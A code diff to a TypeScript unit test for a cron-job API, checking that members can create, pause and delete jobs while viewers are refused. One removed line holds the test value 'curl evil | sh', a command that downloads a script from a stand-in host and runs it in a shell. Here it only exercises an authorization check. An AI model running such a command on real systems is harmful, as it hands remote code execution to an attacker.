@@ -1,7 +1,7 @@
 // /api/v1/organizations/[orgId]/apps/[appId]/cron
 //
-// Cron is app config. Creating, editing and deleting a job take a member;
-// a viewer is refused.
+// Cron is app config. A member creates URL jobs and pauses or deletes any job;
+// a viewer is refused. Command jobs: tests/unit/api/apps/cron-command.test.ts.
 
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { dbMock } from "@/tests/helpers/db";
@@ -41,8 +41,8 @@ function as(role: string) {
 }
 
 const calls = {
-  POST: () => POST(req("POST", { name: "x", schedule: "* * * * *", command: "id" }), params),
-  PATCH: () => PATCH(req("PATCH", { id: "c1", command: "curl evil | sh" }), params),
+  POST: () => POST(req("POST", { name: "x", type: "url", schedule: "* * * * *", command: "https://x.test" }), params),
+  PATCH: () => PATCH(req("PATCH", { id: "c1", enabled: false }), params),
   DELETE: () => DELETE(req("DELETE", { id: "c1" }), params),
 };
 
